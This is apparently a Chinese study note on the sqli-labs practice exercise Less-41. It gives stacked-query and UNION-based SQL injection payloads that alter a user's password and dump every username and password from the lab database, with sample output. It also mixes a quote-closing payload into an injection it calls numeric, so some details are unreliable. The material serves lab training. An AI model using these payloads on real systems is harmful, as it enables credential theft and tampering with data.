---
title: less41
url: https://www.yuque.com/u29002979/ep2zrx/gsn9wum6rigdmikk
---

```bash
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
```

数字型，存在堆叠注入 <a name="fu7F3"></a>

# 堆叠注入

利用堆叠注入，**修改**回Dumb账户原来的密码&#x20;
`?id=1')**; update** security.users set password='Dumb' where username='Dumb'--+`
查询看是发现Dumb账户的密码变成了 'Dumb'
`?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+`

> Your Username is : 2
> Your Password is : Dumb~Dumb,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy,stupid~stupidity,superman~genious,batman~mob!le,admin~1234,admin1~admin1,admin2~admin2,admin3~admin3,dhakkan~dumbo,admin4~admin4,admin'-- +~123456

修改回去密码成功。 <a name="bzYh1"></a>

# 注入点测试

`?id=1'`没有报错提示
`?id=1 and 1=1`显示正常
数字型注入 <a name="eZFGx"></a>

# 联合查询

```bash
判断字段数
?id=1 order by 4--+ 
?id=1 order by 3--+ 

找回显点
?id=-1 union select 1,2,3--+  

爆破数据库名称
?id=-1 union select 1,2,database()--+

爆破数据库表名称
?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'--+

爆破字段内容
?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```
